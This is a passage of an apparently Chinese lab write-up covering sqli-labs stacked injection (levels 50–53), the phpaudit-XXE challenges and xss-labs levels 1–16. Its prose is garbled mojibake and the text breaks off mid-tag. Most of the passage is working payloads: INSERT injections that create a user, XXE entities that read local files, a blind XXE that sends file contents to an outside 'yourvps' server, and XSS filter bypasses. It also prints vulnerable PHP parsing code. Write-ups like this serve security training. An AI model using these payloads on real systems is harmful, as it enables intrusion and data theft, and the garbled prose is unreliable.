æ³¨å…¥ç»“åˆï¼Œæ•°å­—å‹</p><p>payload:</p><pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre><img src="C:/Users/Sunzh/AppData/Roaming/Typora/typora-user-images/image-20210507103942074.png" alt="image-20210507103942074" style="zoom:50%;"><h2 id="level51"><a href="#level51" class="headerlink" title="level51"></a>level51</h2><p>ä¸50å…³ç›¸æ¯”å¢åŠ å•å¼•å·é—­åˆ</p><pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="level52"><a href="#level52" class="headerlink" title="level52"></a>level52</h2><p>ä¸50ç›¸åŒ</p><pre><code class="hljs pgsql">?sort=<span class="hljs-number">1</span>;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)<span class="hljs-comment">--+</span></code></pre><h2 id="level53"><a href="#level53" class="headerlink" title="level53"></a>level53</h2><p>å’Œ51ä¸€æ ·ï¼Œåªæ˜¯ä¸ä¼šå›æ˜¾é”™è¯¯ï¼Œå †å æ³¨å…¥æ–¹å¼ç›¸åŒã€‚</p><pre><code class="hljs n1ql">?sort=1&#x27;;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> users(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">values</span>(<span class="hljs-string">&#x27;16&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>,<span class="hljs-string">&#x27;admin123&#x27;</span>)--+</code></pre><h1 id="xxeæŒ‘æˆ˜"><a href="#xxeæŒ‘æˆ˜" class="headerlink" title="xxeæŒ‘æˆ˜"></a>xxeæŒ‘æˆ˜</h1><p>githubåœ°å€ï¼š<a href="https://github.com/vulnspy/phpaudit-XXE/archive/master.zip">https://github.com/vulnspy/phpaudit-XXE/archive/master.zip</a></p><p>å› ä¸ºç¯å¢ƒæ­å»ºæ¯”è¾ƒç®€å•å°±ç›´æ¥åœ¨windowsä¸Šè¿è¡Œäº†</p><p>è¯»å–çš„æ–‡ä»¶ä¹Ÿéšä¹‹æ”¹å˜ï¼Œåœ¨Dç›˜ä¸­å»ºç«‹ä¸€ä¸ª1.txt</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303194816074.png" alt="image-20210303194816074"></p><h2 id="DOMDocument"><a href="#DOMDocument" class="headerlink" title="DOMDocument"></a>DOMDocument</h2><p>ä½¿ç”¨å¦‚ä¸‹payloadè¯»å–æ–‡ä»¶</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">content</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303194904746.png" alt="image-20210303194904746"></p><p>æ¼æ´åŸå› </p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210330213939369.png" alt="image-20210330213939369" style="zoom:67%;"><p>DOmDocumentç±»</p><p><code>$dom = new DOMDocument();</code></p><pre><code class="hljs php">libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> DOMDocument();    <span class="hljs-variable">$dom</span>-&gt;loadXML(<span class="hljs-variable">$data</span>, LIBXML_NOENT);    ob_start();    var_dump(<span class="hljs-variable">$dom</span>);    <span class="hljs-variable">$resp</span> = ob_get_contents();    ob_end_clean();    &#125;</code></pre><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h2><p>ä½¿ç”¨payloadï¼š</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">content</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303195204160.png" alt="image-20210303195204160"></p><p>æ¼æ´ä»£ç </p><p>é€ æˆ XXE çš„ç±»æ˜¯ SimpleXMLElement</p><pre><code class="hljs php">libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;    <span class="hljs-variable">$xml</span> = <span class="hljs-keyword">new</span> SimpleXMLElement(<span class="hljs-variable">$data</span>, LIBXML_NOENT);    ob_start();    var_dump(<span class="hljs-variable">$xml</span>);    <span class="hljs-variable">$resp</span> = ob_get_contents();    ob_end_clean();   &#125;</code></pre><h2 id="simplexml-load-string"><a href="#simplexml-load-string" class="headerlink" title="simplexml_load_string"></a>simplexml_load_string</h2><p>payload:</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">ANY</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">content</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///D:/1.txt&quot;</span>&gt;</span></span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;content;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303195407342.png" alt="image-20210303195407342"></p><p>é€ æˆæ¼æ´çš„æ˜¯simplexml_load_stringï¼Œä»£ç å¦‚ä¸‹</p><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;    <span class="hljs-variable">$xml</span> = simplexml_load_string(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);    ob_start();    var_dump(<span class="hljs-variable">$xml</span>);    <span class="hljs-variable">$resp</span> = ob_get_contents();    ob_end_clean();    &#125;</code></pre><h2 id="BlindXXE"><a href="#BlindXXE" class="headerlink" title="BlindXXE"></a>BlindXXE</h2><p>è¿™ä¸€å…³æäº¤payloadæ— æ³•çœ‹åˆ°å†…å®¹ï¼Œä½†æ˜¯å¯ä»¥çœ‹åˆ°æ˜¯è®¿é—®æˆåŠŸçš„</p><p>æ­£å¸¸æƒ…å†µä¸‹ï¼Œåªä¼šè¿”å›ç»™æˆ‘ä»¬okï¼Œå³æœ‰æŸ¥è¯¢ç»“æœï¼Œä½†æ˜¯ä¸ä¼šå‘Šè¯‰æˆ‘ä»¬ç»“æœæ˜¯ä»€ä¹ˆ</p><p>æºç å¦‚ä¸‹</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>]))&#123;    show_source(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">exit</span>;&#125;libxml_disable_entity_loader(<span class="hljs-literal">false</span>);<span class="hljs-variable">$data</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])?trim(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]):<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$resp</span> = <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$data</span> != <span class="hljs-literal">false</span>)&#123;    <span class="hljs-variable">$xml</span> = simplexml_load_string(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$xml</span> &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xml</span>-&gt;name))&#123;        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$xml</span>-&gt;name;    &#125;   <span class="hljs-keyword">echo</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$name</span>)?<span class="hljs-string">&#x27;ok&#x27;</span>:<span class="hljs-string">&#x27;error&#x27;</span>; &#125;<span class="hljs-meta">?&gt;</span></code></pre><p>ä¸Šé¢çš„ä¾‹å­æ˜¯å› ä¸º<code>echo htmlspecialchars($resp);</code>è¿™å¥ä»£ç æ‰€ä»¥æ‰æœ‰å›æ˜¾ï¼Œé‚£ä¹ˆæŠŠè¿™æ®µä»£ç å»æ‰ï¼Œå°±å˜æˆäº†æ— å›æ˜¾ã€‚é‚£ä¹ˆï¼Œæ˜¯ä¸æ˜¯å°±ä¸èƒ½è¿›è¡Œxxeäº†å‘¢ï¼Œç­”æ¡ˆæ˜¯å¦å®šçš„ï¼Œè™½ç„¶é¶æœºæ²¡æœ‰è¿”å›ç»™æˆ‘ä»¬æ•°æ®ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŠŠæ•°æ®å¸¦åˆ°æˆ‘ä»¬è‡ªå·±çš„æœåŠ¡å™¨ä¸Šã€‚</p><p>æˆ‘ä»¬ä¼ å…¥å¦‚ä¸‹çš„payloadï¼š</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE a [</span><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;php://filter/convert.base64-encode/resource=D:/1.txt&quot;</span>&gt;</span></span><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">dtd</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;http://yourvps/evil.xml&quot;</span>&gt;</span></span><span class="hljs-meta">    %dtd;</span><span class="hljs-meta">    %send;</span><span class="hljs-meta">]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">abc</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">abc</span>&gt;</span></code></pre><p>ç„¶ååœ¨è‡ªå·±çš„vpsä¸Šçš„<strong>evil.xml</strong>å†™å…¥ï¼š</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-meta-keyword">payload</span> <span class="hljs-meta-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://yourvps/?content=%file;&#x27;&gt;&quot;</span>&gt;</span> %payload;</code></pre><p>æ³¨æ„ï¼Œå› ä¸ºè¿™é‡Œæ˜¯å‚æ•°å®ä½“payloadæ¥<strong>åµŒå¥—å®šä¹‰</strong>å‚æ•°å®ä½“<strong>send</strong>ï¼Œæ‰€ä»¥è¢«<strong>åµŒå¥—å®šä¹‰</strong>çš„å‚æ•°å®ä½“<code>%</code>ä¸€å®šè¦HTMLç¼–ç ä¸ºï¼š<code>%</code></p><p>å¦‚æ­¤ä¸€æ¥ï¼Œè°ƒç”¨çš„è¿‡ç¨‹å°±å˜æˆäº†ï¼šå‚æ•°å®ä½“dtdé€šè¿‡<strong>http</strong>åè®®æ¥è®¿é—®vpsä¸Šçš„<strong>evil.xml</strong>ï¼Œç„¶åè¿”å›<strong>evil.xml</strong>çš„å†…å®¹ï¼Œè°ƒç”¨äº†å‚æ•°å®ä½“<strong>payload</strong>ï¼Œç„¶å<strong>payload</strong>åˆè°ƒç”¨äº†å‚æ•°å®ä½“<strong>send</strong>ï¼Œ<strong>send</strong>çš„ä½œç”¨å°±æ˜¯æŠŠå‚æ•°å®ä½“<strong>file</strong>ï¼ˆå³æ–‡ä»¶D:/1.txtçš„base64ç¼–ç å†…å®¹ï¼‰å‘é€åˆ°æˆ‘ä»¬çš„vpsä¸Šï¼Œæ³¨æ„åœ¨æœåŠ¡å™¨ä¸Šç›‘å¬</p><h1 id="xssé€šå…³"><a href="#xssé€šå…³" class="headerlink" title="xssé€šå…³"></a>xssé€šå…³</h1><p>å› ä¸ºç½‘ä¸Šæœ‰æŒ‘æˆ˜é¢˜ç›®çš„ç½‘å€å°±æ²¡åœ¨æœ¬åœ°æ­å»º</p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>æœ€åŸºç¡€çš„xssï¼Œgetæäº¤</p><pre><code class="hljs javascript">?name=<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303151729341.png" alt="image-20210303151729341"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>ç¬¬äºŒå…³ç›´æ¥æäº¤ä¼šå‘ç°æ²¡æœ‰å¼¹çª—</p><p>æŸ¥çœ‹æºç å¯ä»¥çœ‹åˆ°ï¼Œå› ä¸º<code>&lt;script&gt;</code>ï¼Œè¢«åŒ…è£¹åœ¨<code>input</code>æ ‡ç­¾ä¸­æ— æ³•èµ·ä½œç”¨ï¼Œå› æ­¤éœ€è¦å…ˆé—­åˆ<code>input</code>æ ‡ç­¾</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152358665.png" alt="image-20210303152358665" style="zoom:50%;"><p>payload</p><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152632625.png" alt="image-20210303152632625" style="zoom:50%;"><h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>ç›´æ¥æäº¤æŸ¥çœ‹æºç </p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303152721584.png" alt="image-20210303152721584"></p><p>å¯ä»¥å‘ç°æäº¤åçš„æ•°æ®ç»è¿‡<code>htmlspecialchars()</code>è½¬åŒ–æˆäº†å®ä½“å˜é‡ä¸åœ¨æœ‰jsä»£ç çš„ä½œç”¨ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸€ç§æ–¹æ³•</p><p>payload</p><pre><code class="hljs \">&#39;onclick&#x3D;&#39;javascript:alert(1)&#39;</code></pre><p>å†ç‚¹å‡»ä¸€æ¬¡å°±å¯ä»¥è¿‡å…³</p><h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>è¿™é¢˜ä¸ä¸Šé¢çš„ä¸€æ ·åªä¸è¿‡è¿™æ¬¡æ¢æˆäº†åŒå¼•å·é—­åˆ</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153135610.png" alt="image-20210303153135610"></p><pre><code class="hljs 1c"><span class="hljs-string">&quot;onclick=&#x27;javascript:alert(1)&#x27;</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153118763.png" alt="image-20210303153118763" style="zoom:50%;"><h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>æäº¤<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153451829.png" alt="image-20210303153451829"></p><p>å¯ä»¥å‘ç°scriptè¢«æ¢æˆäº†scr_iptï¼Œä½¿ç”¨<code>&quot;onclick=&#39;javascript:alert(1)&#39;</code>ä¹Ÿä¸è¡Œ</p><p>å†æ¢ä¸€ç§æ–¹æ³•</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303153621744.png" alt="image-20210303153621744"></p><h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>å°è¯•äº†</p><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot; &quot;</span>&gt;&lt;a <span class="hljs-attribute">hr_ef</span>=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span>&gt;&quot;&gt;&lt;input <span class="hljs-attribute">name</span>=keyword  <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot; &quot;</span>o_nclick=&#x27;javascript:alert(1)&#x27; <span class="hljs-string">&quot;&gt;</span><span class="hljs-string">&lt;input name=keyword  value=&quot;</span> <span class="hljs-string">&quot;&lt;scr_ipt&gt; alert(1)&lt;/script&gt;&quot;</span>&gt;</code></pre><p>ä½†æ˜¯éƒ½ä¸è¡Œäº†ï¼Œå°è¯•äº†çœ‹æ ·å­æ˜¯è¿‡äº†href, onclick, scriptå…³é”®è¯ï¼Œå°è¯•å¤§å°å†™ç»•è¿‡</p><p>æäº¤</p><pre><code class="hljs 1c"><span class="hljs-string">&quot;oNclick=&#x27;javascript:alert(1)&#x27;</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160021818.png" alt="image-20210303160021818"></p><h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>æäº¤<code>&quot;oNclick=&#39;javascript:alert(1)&#39;</code>,ä½†æ˜¯å‘ç°onè¢«è¿‡æ»¤äº†</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160102536.png" alt="image-20210303160102536"></p><p>ç›´æ¥å°è¯•åŒå†™ç»•è¿‡</p><pre><code class="hljs ada">oonnclick=<span class="hljs-symbol">&#x27;javascript</span>:alert(<span class="hljs-number">1</span>)</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160204046.png" alt="image-20210303160204046"></p><h2 id="8"><a href="#8" class="headerlink" title="8"></a>8</h2><p>æäº¤<code>&quot;oNclick=&#39;javascript:alert(1)</code>ï¼Œå¯ä»¥å‘ç°è¿‡æ»¤äº† <code>&quot; &lt; &gt;</code>ï¼Œè€Œä¸”è¿›è¡Œäº†å®ä½“è½¬æ¢</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160514318.png" alt="image-20210303160514318"></p><p>æ¢ä¸€ç§æ–°çš„æ³¨å…¥æ–¹æ³•htmlå­—ç¬¦è½¬æ¢ç»•è¿‡</p><pre><code class="hljs apache"><span class="hljs-attribute">java</span>&amp;#<span class="hljs-number">115</span>;&amp;#<span class="hljs-number">99</span>;&amp;#<span class="hljs-number">114</span>;&amp;#<span class="hljs-number">105</span>;&amp;#<span class="hljs-number">112</span>;&amp;#<span class="hljs-number">116</span>;:alert(<span class="hljs-number">1</span>)</code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303160720539.png" alt="image-20210303160720539"></p><h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>å°è¯•ç¬¬å…«å…³ä½¿ç”¨çš„ä»£ç ä½†æ˜¯å‘ç°ä¸è¡Œ</p><p>ä½†æ˜¯æŸ¥çœ‹æºç å¯ä»¥å‘ç°æç¤ºä½ çš„é“¾æ¥ä¸åˆæ³•ï¼Œé‚£ä¹ˆåˆæ³•çš„é“¾æ¥æœ‰ä»€ä¹ˆç‰¹ç‚¹å‘¢</p><p>å°±æ˜¯å¸¦æœ‰åè®®å¤´</p><pre><code class="hljs javascript">java&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:alert(<span class="hljs-number">1</span>) <span class="hljs-comment">// http://</span></code></pre><h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><p>å°è¯•äº†å‡ ç§æ–¹æ³•ä¹‹åå‘ç° ,æ²¡æœ‰è¾“å‡ºç‚¹</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162415275.png" alt="image-20210303162415275"></p><p>å¯ä»¥å‘ç°è¾“å…¥ç‚¹æ˜¯éšè—çš„</p><p>ä½¿ç”¨ä¸‹é¢ä»£ç æµ‹è¯•ä»¥ä¸Šä¸‰ä¸ªå“ªä¸ªæ˜¯å¯ä»¥æ³¨å…¥çš„</p><pre><code class="hljs dts"><span class="hljs-variable">&amp;t_link</span>=<span class="hljs-string">&quot; text&quot;</span> <span class="hljs-variable">&amp;t_history</span>=<span class="hljs-string">&quot;text&quot;</span><span class="hljs-variable">&amp;t_sort</span>=<span class="hljs-string">&quot;text&quot;</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162558986.png" alt="image-20210303162558986"></p><p>å†æ„é€ ä»£ç </p><pre><code class="hljs isbl">&amp;<span class="hljs-variable">t_sort</span>=<span class="hljs-string">&quot; type=&quot;</span><span class="hljs-variable">text</span><span class="hljs-string">&quot; onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span></code></pre><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303162721705.png" alt="image-20210303162721705"></p><h2 id="11"><a href="#11" class="headerlink" title="11"></a>11</h2><p>è¿›å…¥é¡µé¢åå°è¯•ä½¿ç”¨ä¸Šä¸€å…³çš„æ–¹æ³•ä½†æ˜¯æ— æ•ˆï¼Œä¸Šç½‘æŸ¥çœ‹åå‘ç°æ˜¯å†refereå¤´æ³¨å…¥</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164336051.png" alt="image-20210303164336051" style="zoom:50%;"><p>å¯ä»¥å‘ç°ç›¸åº”åŒ…ä¸­å·²ç»è¢«æ³¨å…¥äº†XSS</p><p>åœ¨æŠ“åŒ…é¡µé¢è¿”å›ç»™æµè§ˆå™¨ï¼Œå°±ä¼šå‡ºç°è¢«æ³¨å…¥çš„è¾“å…¥æ¡†</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164657154.png" alt="image-20210303164657154" style="zoom:50%;"><h2 id="12"><a href="#12" class="headerlink" title="12"></a>12</h2><p>ç»§ç»­æŠ“åŒ…ï¼Œè¿™æ¬¡å¯ä»¥å‘ç°æ˜¯åœ¨UAä¸­æ³¨å…¥</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164836733.png" alt="image-20210303164836733" style="zoom:67%;"><p>ä¸ä¸Šä¸€å…³åšæ³•ç›¸ä¼¼</p><p>å‡ºç°è¾“å…¥æ¡†ç‚¹å‡»å³å¯</p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303164930662.png" alt="image-20210303164930662" style="zoom:50%;"><h2 id="13"><a href="#13" class="headerlink" title="13"></a>13</h2><p>è¿™å…³æ˜¯åœ¨cookieå¤„æ³¨å…¥ï¼Œæ–¹æ³•ä¸ä¹‹å‰ç›¸åŒ</p><p>payload</p><pre><code class="hljs isbl"><span class="hljs-variable">cookie</span>: åŸå€¼+<span class="hljs-variable">user</span>=<span class="hljs-string">&quot; type=text onclick=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span></code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303165143032.png" alt="image-20210303165143032" style="zoom:67%;"><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2><p>éœ€è¦ä½¿ç”¨å¸¦XSSçš„å›¾ç‰‡</p><h2 id="15"><a href="#15" class="headerlink" title="15"></a>15</h2><p>ç›´æ¥æŸ¥çœ‹æºç </p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171027487.png" alt="image-20210303171027487" style="zoom:50%;"><p>è¿™é‡Œç”¨äº†angularjsçš„ng-includeï¼Œç›´æ¥åœ¨åŒ…å«çš„é¡µé¢é‡Œç”¨<code>&lt;script&gt;</code>è§¦å‘ä¸äº†ï¼Œç”¨äº†imgæ ‡ç­¾</p><p>AngularJS ng-include æŒ‡ä»¤</p><p>ng-include æŒ‡ä»¤ç”¨äºåŒ…å«å¤–éƒ¨çš„ HTML æ–‡ä»¶ã€‚</p><p>åŒ…å«çš„å†…å®¹å°†ä½œä¸ºæŒ‡å®šå…ƒç´ çš„å­èŠ‚ç‚¹ã€‚</p><p>ng-include å±æ€§çš„å€¼å¯ä»¥æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¿”å›ä¸€ä¸ªæ–‡ä»¶åã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒåŒ…å«çš„æ–‡ä»¶éœ€è¦åŒ…å«åœ¨åŒä¸€ä¸ªåŸŸåä¸‹ã€‚</p><pre><code class="hljs livecodeserver">&lt;<span class="hljs-keyword">element</span> ng-<span class="hljs-built_in">include</span>=<span class="hljs-string">&quot;filename&quot;</span> onload=<span class="hljs-string">&quot;expression&quot;</span> autoscroll=<span class="hljs-string">&quot;expression&quot;</span> &gt;&lt;/<span class="hljs-keyword">element</span>&gt;</code></pre><p>éµå¾ªSOPï¼Œåªå¥½è°ƒç”¨ç¬¬ä¸€å…³ä»£ç ã€‚</p><p>éœ€è¦å•å¼•å·åŒ…è£¹ï¼Œå¦åˆ™å˜æˆæ³¨é‡Šã€‚</p><p>paloadï¼š</p><pre><code class="hljs xml">/level15.php?src=&#x27;level1.php?name=test<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>&#x27;</code></pre><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210303171428095.png" alt="image-20210303171428095" style="zoom:50%;"><h2 id="16"><a href="#16" class="headerlink" title="16"></a>16</h2><p>æµ‹è¯•å‘ç°è¿‡æ»¤ç©ºæ ¼ï¼Œscriptï¼Œ/ï¼Œæ‰€ä»¥ä½¿ç”¨%0d %0aåšåˆ†å‰²ç¬¦ç»•è¿‡è¿‡æ»¤</p><p>payload</p><pre><code class="hljs llvm">&lt;img<span class="hljs-variable">%0</span>Asrc<span class="hljs-operator">=</span><span class="hljs-keyword">x</span><span class="hljs-variable">%0</span>Aonerror<span class="hljs-operator">=</span>alert(a)&gt;&lt;iframe<span 